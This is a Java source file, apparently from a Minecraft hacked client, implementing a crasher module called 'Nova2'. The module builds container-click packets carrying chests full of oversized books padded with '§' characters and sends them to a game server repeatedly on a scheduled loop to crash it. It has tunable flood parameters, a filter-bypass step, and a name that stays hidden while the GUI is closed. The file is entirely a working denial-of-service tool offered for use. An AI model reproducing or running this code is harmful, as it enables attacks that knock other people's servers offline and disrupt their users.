package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.nbt.Tag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataContainer;
import us.whitedev.protocol.components.data.impl.DataWritableBookContent;
import us.whitedev.protocol.components.data.impl.DataWrittenBookContent;
import us.whitedev.protocol.components.data.impl.Filterable;
import us.whitedev.protocol.components.objects.ItemType;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Nova2 implements Crasher {
    private static final String METHOD_NAME = "Nova2";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int amount = Integer.parseInt(args[4]);
        int scales = Integer.parseInt(args[5]);
        String type = args[6].toLowerCase(Locale.ROOT);
        long threadSleep = Long.parseLong(args[7]);
        int loopAmount = Integer.parseInt(args[8]);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        ServerboundContainerClickPacket nbtPacket;
        PacketContainerClick dataPacket;

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            nbtPacket = null;
            dataPacket = getDataChestPacket(size, amount, scales, type, protocol);
        } else {
            dataPacket = null;
            nbtPacket = getNBTChestPacket(size, amount, scales, type);
        }

        AtomicInteger check = new AtomicInteger(0);
        executorService = Executors.newSingleThreadScheduledExecutor();
        Runnable clickTask = () -> {
            if (!enabled || check.get() == loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                executorService.shutdown();
                setEnabled(false);
                msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
            }else {
                if (dataPacket != null) PacketCodec.sendPacket(dataPacket, packets);
                else for (int i = 0; i < packets; i++) PacketHelper.send(nbtPacket);
            }

            check.getAndIncrement();
        };
        executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
    }

    private ServerboundContainerClickPacket getNBTChestPacket(int size, int amount, int scales, String type) {
        StringTag pageTag = new StringTag("§".repeat(size));
        ListTag pagesTag = new ListTag();
        for (int i = 0; i < amount; ++i) pagesTag.add(pageTag);
        CompoundTag bookTag = new CompoundTag();
        bookTag.put("pages", pagesTag);
        bookTag.putString("author", "GodIsKing");
        bookTag.putString("title", "sigma");

        ListTag chestItemsTag = new ListTag();
        for (int i = 0; i <= scales; i++) {
            CompoundTag itemTag = new CompoundTag();
            itemTag.putByte("Slot", (byte) i);
            if (type.equals("default")) itemTag.putString("id", "minecraft:writable_book");
            else itemTag.putString("id", "minecraft:written_book");
            itemTag.putByte("Count", (byte) 1);
            itemTag.put("tag", bookTag);
            chestItemsTag.add(itemTag);
        }

        CompoundTag blockEntityTag = new CompoundTag();
        blockEntityTag.put("Items", chestItemsTag);

        CompoundTag chestTag = new CompoundTag();
        chestTag.put("BlockEntityTag", blockEntityTag);

        ItemStack itemStack = new ItemStack(Items.TRAPPED_CHEST, 1, Optional.of(chestTag));

        return new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.QUICK_MOVE, itemStack, new Int2ObjectOpenHashMap<>());
    }

    private PacketContainerClick getDataChestPacket(int size, int amount, int scales, String type, int protocol) {
        String text = "§".repeat(size);
        us.whitedev.protocol.components.objects.ItemStack itemStack;
        if (type.equals("default")) {
            List<Filterable<String>> pagesList = new ArrayList<>();
            for (int i = 0; i < amount; i++) pagesList.add(new Filterable<>(text, null));
            DataWritableBookContent dataWritableBookContent = new DataWritableBookContent(pagesList);

            DataComponents dataComponents = new DataComponents();
            dataComponents.put(dataWritableBookContent);

            itemStack = new us.whitedev.protocol.components.objects.ItemStack(ItemType.WRITABLE_BOOK.getId(protocol), 1, dataComponents);
        } else {
            CompoundTag pageText = bypassHelper.convert(text);
            List<Filterable<Tag>> pagesList = new ArrayList<>();
            for (int i = 0; i < amount; i++) pagesList.add(new Filterable<>(pageText, null));
            DataWrittenBookContent dataWrittenBookContent = new DataWrittenBookContent(new Filterable<>("GodIsKingClient", null), "GodIsKing", 1, pagesList, true);

            DataComponents dataComponents = new DataComponents();
            dataComponents.put(dataWrittenBookContent);

            itemStack = new us.whitedev.protocol.components.objects.ItemStack(ItemType.WRITTEN_BOOK.getId(protocol), 1, dataComponents);
        }
        List<us.whitedev.protocol.components.objects.ItemStack> itemStacks = new ArrayList<>();

        for (int i = 0; i < scales; i++) itemStacks.add(itemStack);

        DataComponents dataComponents = new DataComponents();
        dataComponents.put(new DataContainer(itemStacks));

        us.whitedev.protocol.components.objects.ItemStack chestStack = new us.whitedev.protocol.components.objects.ItemStack(ItemType.CHEST.getId(protocol), 1, dataComponents);

        return new PacketContainerClick(protocol, 0, 1, 10,
                PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                chestStack, new Int2ObjectArrayMap<>());
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Amount", OptionType.INTEGER),
                new OptionUtil("Scales", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Default", "Saved"}),
                new OptionUtil("Thread Sleep", OptionType.INTEGER),
                new OptionUtil("Loop Amount", OptionType.INTEGER)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[10], size[100], amount[100], scales[100], type[default], sleep[100], loops[10]";
    }


    @Override
    public String getDescription() {
        return "Transformer Flood Crasher";
    }
}
